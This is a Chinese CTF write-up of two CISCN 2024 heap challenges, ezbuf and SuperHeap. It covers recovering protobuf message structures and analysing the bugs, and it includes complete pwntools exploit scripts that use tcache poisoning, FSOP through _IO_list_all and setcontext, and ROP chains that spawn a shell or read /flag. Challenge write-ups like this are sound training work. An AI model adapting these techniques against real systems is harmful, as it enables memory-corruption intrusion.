前置知识
====

- 在go pwn的堆题中，经常会有结构体，在go中这些结构体就是通过protobuf来传递的
- 如果抹除了protobuf的标志，那就只能手撕了，具体可以看CISCN里面的几个例子，如果没有抹除标志，那就可以用[pbtk这个工具了](https://xz.aliyun.com/t/12580?time__1311=mqmhD50KBIPG2xBT4%2BOrTo47KAwjDWwD&alichlgref=https%3A%2F%2Fwww.bing.com%2F#toc-1)
- 实际操作中发现要先让pwn文件的可以正常执行后，再用pbtk，感觉这个有点像seccomp-tools要跑pwn文件才能得到结果

```bash
$ sudo apt install python3-pip git openjdk-11-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5
$ sudo pip3 install protobuf pyqt5 pyqtwebengine requests websocket-client
$ git clone https://github.com/marin-m/pbtk
$ cd pbtk
$ ./gui.py

#但一般是用下面这个
#脚本可以在没有 GUI 的情况下独立使用：
#./extractors/from_binary.py [-h] input_file [output_dir]，注意要到pbtk这个文件夹
/home/zp9080/PWN/pbtk/extractors/from_binary.py ./pwn ~/PWN/
#之后再用如下指令就可以得到对应的py文件
protoc --python_out=./ ./devicemsg.proto
```

```C
typedef enum {
 PROTOBUF_C_TYPE_INT32,   0   /**< int32 */
 PROTOBUF_C_TYPE_SINT32,  1   /**< signed int32 */
 PROTOBUF_C_TYPE_SFIXED32, 2  /**< signed int32 (4 bytes) */
 PROTOBUF_C_TYPE_INT64,   3   /**< int64 */
 PROTOBUF_C_TYPE_SINT64,  4   /**< signed int64 */
 PROTOBUF_C_TYPE_SFIXED64, 5  /**< signed int64 (8 bytes) */
 PROTOBUF_C_TYPE_UINT32,   6  /**< unsigned int32 */
 PROTOBUF_C_TYPE_FIXED32,  7  /**< unsigned int32 (4 bytes) */
 PROTOBUF_C_TYPE_UINT64,   8  /**< unsigned int64 */
 PROTOBUF_C_TYPE_FIXED64, 9   /**< unsigned int64 (8 bytes) */
 PROTOBUF_C_TYPE_FLOAT,   10   /**< float */
 PROTOBUF_C_TYPE_DOUBLE,   11  /**< double */
 PROTOBUF_C_TYPE_BOOL,   12    /**< boolean */
 PROTOBUF_C_TYPE_ENUM,   13  /**< enumerated type */
 PROTOBUF_C_TYPE_STRING,  14   /**< UTF-8 or ASCII string */
 PROTOBUF_C_TYPE_BYTES,   15   /**< arbitrary byte sequence */
 PROTOBUF_C_TYPE_MESSAGE,  16   /**< nested message */
} ProtobufCType;
```

CISCN2024初赛 ezbuf(需要手动分析提取)
===========================

protobuf
--------

1. 第一个字节是这个变量的初值，初值不可以随意赋值
2. +4偏移的数字还不知道是什么含义，但不影响做题
3. +8偏移的这个至关重要，这决定着在protobuf中这个是什么类型的变量，具体要参考下表，其实就是一个从0开始的偏移，比如这个0xf，那就是对应着0xf偏移也就是bytes类型
4. 0x10偏移处就是对应着这个偏移

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-b3c0459e20808cb4265b9345080a3f6696a3e728.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-000e2ddedc216b6c8e1167fc1eff7a3a1b5639e0.png)

- 这个题中whatsthis+8偏移是6，所以是uint32类型

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-1df6fd53ceb4bae6873c8204866d66b4c2af4ac3.png)

- 此题的probuf就可以写出来了,发现message后的名称和题中不同也不影响交互，比如此题是heybro,不和这个相同也不影响

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-c3c139cecb3baae3e67cf49494ac867797971e8c.png)

```protobuf
syntax = "proto2";
message devicemsg{
    required bytes whatcon = 1;
    required sint64 whattodo = 2;
    required sint64 whatidx = 3;
    required sint64 whatsize=4; 
    required uint32 whatsthis=5;  
}
```

题目分析
----

- add

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-6feb99fd3aa1e4063a2953b714ebd69af3b717df.png)

- delete

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-5d3953b900376b6c4a09b6dea0601eb24fab3517.png)

- show

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-72c6e6e67710ca599a5328d6509f6a3dbc6f0d2a.png)

- clean

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-32492b9ff95b597686a6e56580665a4631141689.png)

- 这个题要留意的是data也就是msg是在堆上的，是会根据其大小得到相应大小的堆块，同时数据会复制到该堆块上，这个地方非常有用
- delete有uaf,说明可以double free，但是有次数限制
- show有两个地方没什么用，同时如果show三次就会close(1),close(2)，显然show两次是最好的，一次heapbase,一次libcbase
- clean看似什么都没做，实际上处理输入的msg,会申请堆块

做题过程
----

- heapbase是很好泄露的
- libcbase是这样的泄露的：由于这种题涉及到很多的堆块操作，因此一开始堆块结构是很乱的。可以看到一开始有smallbin，同时注意到add有memcpy，因此data可以申请到这里的堆块复制到chunk，然后show就可以泄露了

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-fa25c2e9f3b619f4d96eed80b7958ee21a0ec228.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-6a70209651d606322978115b8e9ffeab3937a161.png)

- delete次数有限如何做到多次任意地址申请，显然是要通过tcache\_perthread结构（但是可以edit大小有限，因此得想办法edit更大的区域），通过仅有的一次fastbin double free申请得到heapbase+0xf0。
- 注意到一开始bin中有个0xf0 tcache chunk，那么可以通过修改tcache\_perthread结构将这个chunk改为heapbase+0x10，然后通过clean函数处理msg就实现了可以edit 0xe0大小的tcache\_perthread结构

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-8ad155e4327e12f42c24ff400348aae1bacefa65.png)

- 剩下的就不是很难了，一开始准备申请出environ泄露stack,但是memcpy的赋值会覆盖原本存的值，而且show三次会关闭标准输入输出，所以最后通过打stdout来泄露出stack，然后orw就行了

exp
---

```python
from pwn import *
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
import devicemsg_pb2
context(os='linux', arch='amd64', log_level='debug')
p = process("/home/zp9080/PWN/pwn")
elf = ELF("/home/zp9080/PWN/pwn")
libc=elf.libc
def dbg():
    gdb.attach(p,'b *$rebase(0x1994)')  
    pause()

menu="WHAT DO YOU WANT?\n"
def add(msgidx, msgdent):
    d = devicemsg_pb2.devicemsg()
    d.whatcon = msgdent
    d.whattodo= 1
    d.whatidx = msgidx
    d.whatsize=0
    d.whatsthis=0
    strs = d.SerializeToString()
    p.sendafter(menu, strs)

def delete(msgidx):
    d = devicemsg_pb2.devicemsg()
    d.whatcon = b''
    d.whattodo= 2
    d.whatidx = msgidx
    d.whatsize=0
    d.whatsthis=0
    strs = d.SerializeToString()
    p.sendafter(menu, strs)

def show(msgidx):
    d = devicemsg_pb2.devicemsg()
    d.whatcon = b''
    d.whattodo= 3
    d.whatidx = msgidx
    d.whatsize=0x20
    d.whatsthis=0x20
    strs = d.SerializeToString()
    p.sendafter(menu, strs)

def clean(msg):
    d = devicemsg_pb2.devicemsg()
    d.whatcon=msg
    d.whattodo=0
    d.whatidx=0
    d.whatsize=0x20
    d.whatsthis=0x20
    p.sendafter("WHAT DO YOU WANT?",d.SerializeToString())

#泄露libcbase
dbg()
for i in range(9):
    add(i,b"a"*8)
show(0)
p.recvuntil(b'a'*8)
libcbase = u64(p.recvuntil("\x7f")[-6:].ljust(0x8,b"\x00")) - 0x219ce0 - 0x1000
print(hex(libcbase))

#泄露heapbase
delete(0)
show(0)
p.recvuntil("Content:")
heapbase = u64(p.recv(5).ljust(0x8,b"\x00")) * 0x1000 - 0x2000
print(hex(heapbase))

#fastbin double free
for i in range(6):
    delete(i+1)
delete(7)
delete(8)
delete(7)
for i in range(7):
    add(i,b"a"*0x8)
environ = libcbase+libc.sym['environ']
stdout = libcbase+libc.sym['_IO_2_1_stdout_']
#ck7->ck8->ck7
add(7,p64((heapbase+0xf0) ^((heapbase+0x4e40)>>12)))
#ck8->ck7->heapbase+0xf0   
add(8,b"AAAAAA")
add(8,b"A")
#0xf0 tcache chunk被改为heapbase+0x10
add(8,p64(0)+p64(heapbase+0x10))

#msg是在堆上的,可以通过msg来给堆上数据赋值
#通过stdout泄露stack
payload=( (p16(0)*2+p16(1)+p16(1)).ljust(0x10,b"\x00")+p16(1)+p16(1) ).ljust(0x90,b'\x00')
payload+=p64(stdout)+p64(heapbase+0x9000)+p64(0)*5+p64(heapbase+0x10)
payload=payload.ljust(0xe0,b"\x00")
clean(payload)
clean(p64(0xFBAD1800)+p64(0)*3+p64(environ)+p64(environ+8))
stack = u64(p.recvuntil("\x7f")[-6:].ljust(0x8,b"\x00")) - 0x1a8 + 0x40
print(hex(stack))

#0xb0的tcache chunk一开始也是被写入heapbase+0x10  getshell
pop_rdi = libcbase+0x000000000002a3e5 
system = libc.sym['system'] + libcbase
binsh = libcbase+0x1D8678
ret = 0x000000000002a3e6 + libcbase
payload=((p16(0)*2+p16(0)+p16(0)+p16(1)).ljust(0x10,b"\x00")+p16(1)+p16(1)).ljust(0x90,b'\x00')
payload+=p64(0)+p64(0)+p64(stack)
payload=payload.ljust(0xa0,b"\x00")
clean(payload)
clean((p64(ret)*2+p64(pop_rdi)+p64(binsh)+p64(system)).ljust(0x58,b"\x00"))

p.interactive()

```

CISCN2024初赛 SuperHeap(直接用pbtk提取)
================================

逆向分析
----

**在逆向分析中我们得先假设程序输入后就是正常逻辑的进行处理**

**七分逆向三分猜，有时候难以理解的部分通过动调发现是在做什么**

- 找到main后根据string判断每个函数分别是什么，重命名一下
- 题目中一个比较关键的结构体

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-dd7ded0a397424c4816d9198d212434f0cea89db.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-d62ba8ab5c0f4942446db33d7d5fa6be6cb8027b.png)

- add函数先对输入数据进行base32解密，再对解密后的date,title,author,isbn进行protobuf获取数据，再对该数据进行base64解密
- 猜测这个就是malloc

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-8b60452e9b26e68351e84ac252d28dbb7e01930e.png)

- 直接动调看chunklist发现chunklist存的是一个堆块，这个堆块存着date,title,author,isbn这四个堆块的数据

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-1b63dd4bc47732c05a1c8331989a51fae8fd92f6.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-1c04745b75acc486a2d4f4ee083420d0ec1d6822.png)

- delete部分，其实主要也就是看有无uaf这些

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-e274bb39782349cad9576068611ba22c42198106.png)

猛一看好像chunklist会清0

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-3db105a186a56603955f71cb79542742d7cd95c2.png)

- edit部分，通过前面的输入检查后，发现没有malloc堆块，而是把输入的数据利用memmove复制到相应的地方

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-008b6ff578a088c9643deee0da89b7fe1ca66853.png)

- show函数就是很常规的，先找到四个堆块的地址，然后打印

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-ac9dc9dc9f163d90959e23cf63a4469c258527aa.png)

- search函数就不用看了，但是这个可以当作一个提示，就是此题是用一个堆块存其他堆块信息这种做题的方法

exp
---

- 逆向分析结束后发现虽然没有uaf,但是edit是没有长度限制的
- edit长度无限就表明可以随意控制堆上结构，然后再通过edit函数中memmove，这就是随便地任意写，随便打

```python
from pwn import *
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
import base64
import bookProto_pb2
context(os='linux', arch='amd64', log_level='debug')
p = process("/home/zp9080/PWN/SuperHeap")
elf = ELF("/home/zp9080/PWN/SuperHeap")
libc=elf.libc
def dbg():
    gdb.attach(p,'b *$rebase(0x20e255)')  
    pause()

cont = bookProto_pb2.CTFBook()

def add(idx,date,title=b"AA",author=b"AAAA",isbn=b"AAA"):
    p.sendlineafter("Enter your choice >","1")
    p.sendlineafter("Index:",str(idx))

    cont.title = base64.b64encode(title)
    cont.author = base64.b64encode(author)
    cont.isbn = base64.b64encode(isbn)
    cont.publish_date = base64.b64encode(date)
    cont.price = 41
    cont.stock = 1
    payload = base64.b32encode(cont.SerializeToString())
    p.sendlineafter("Special Data:",payload)

def edit(idx,date,title=b"AA",author=b"AAAA",isbn=b"AAA"):
    p.sendlineafter("Enter your choice >","4")
    p.sendlineafter("Index:",str(idx))

    cont.title = base64.b64encode(title)
    cont.author = base64.b64encode(author)
    cont.isbn = base64.b64encode(isbn)
    cont.publish_date = base64.b64encode(date)
    cont.price = 41
    cont.stock = 1
    payload = base64.b32encode(cont.SerializeToString())
    p.sendlineafter("Special Data:",payload)

def show(idx):
    p.sendlineafter("Enter your choice >","2")
    p.sendlineafter("Index:",str(idx))

def delete(idx):
    p.sendlineafter("Enter your choice >","3")
    p.sendlineafter("Index:",str(idx))    

add(0,b"A"*0x20)
add(1,b"A"*0x430,title=b"BBBBB")
add(2,b"A"*0x430)
add(3,b"A"*0x430)

dbg()
#为了创造出unsorted bin chunk
delete(2)
#泄露heapbase
edit(0,b"A"*0x30)
show(0)
p.recvuntil("A"*0x30)
heap_addr = u64(p.recv(6).ljust(0x8,b"\x00")) - 0x2e90
#泄露libcbase，利用刚才的ck2
edit(0,b"A"*(0x70+0x440))
show(0)
libc.address = u64(p.recvuntil("\x7f")[-6:].ljust(0x8,b"\x00")) - 0x219ce0 - 0x1000
print(hex(heap_addr))
print(hex(libc.address))

#这里直接把ck1的date这个堆块修改为_IO_list_all
payload = b"A"*0x28 + p64(0x41) + p64(heap_addr + 0x2e90) + p64(0x2cf0+heap_addr) + p64(0x2b50+heap_addr) + p64(libc.sym['_IO_list_all']) + p64(0x4044800000000000) + p64(200)
edit(0,payload)
#_IO_list_all=0x3730+heap_addr
edit(1,p64(0x3730+heap_addr))
#再把ck1的date修改为heap_addr+0x3730,然后edit(1)就可以往heap_addr+0x3730处赋值
payload = b"A"*0x28 + p64(0x41) + p64(heap_addr + 0x2e90) + p64(0x2cf0+heap_addr) + p64(0x2b50+heap_addr) + p64(heap_addr+0x3730) + p64(0x4044800000000000) + p64(200)
edit(0,payload)

fake_io_addr = heap_addr + 0x3730
_IO_wfile_jumps = libc.sym["_IO_wfile_jumps"]
ROP_addr = heap_addr + 0x4000
ret = 0x000000000002a3e6 + libc.address
setcontext = libc.sym['setcontext']
pop_rdi = 0x000000000002a3e5 + libc.address
pop_rdx =  0x000000000011f2e7 + libc.address
pop_rsi = 0x000000000002be51 + libc.address

FP = fake_io_addr
A = FP + 0x100
B = A + 0xe0 - 0x60

payload = (0xa0-0x10)*b"\x00" + p64(A) # 
payload = payload.ljust(0xb0,b"\x00") + p64(1)
payload = payload.ljust(0xc8,b"\x00") + p64(_IO_wfile_jumps-0x40)
payload = payload.ljust(0x190,b"\x00") + p64(ROP_addr) + p64(ret)
payload = payload.ljust(0xf0+0xe0,b"\x00") + p64(B) + p64(setcontext + 61)
edit(1,p64(0)*2+payload) #修改heap_addr+0x3730构造IO链

#修改ck1的date为heap_addr+0x4000，布置ROP
payload = b"A"*0x28 + p64(0x41) + p64(heap_addr + 0x2e90) + p64(0x2cf0+heap_addr) + p64(0x2b50+heap_addr) + p64(heap_addr+0x4000) + p64(0x4044800000000000) + p64(200)
edit(0,payload)
payload = p64(pop_rdi) + p64(ROP_addr+0x100) + p64(pop_rdx) + p64(0)*2 + p64(pop_rsi) + p64(0) + p64(libc.sym['open'])
payload += p64(pop_rdi) + p64(3) + p64(pop_rdx) + p64(0x40) *2 + p64(pop_rsi) + p64(heap_addr+0x1000) + p64(libc.sym['read'])
payload += p64(pop_rdi) + p64(1) + p64(libc.sym['write'])
payload = payload.ljust(0x100,b"\x00") + b"/flag\x00"
edit(1,payload)

p.sendlineafter("Enter your choice >","6")

p.interactive()
```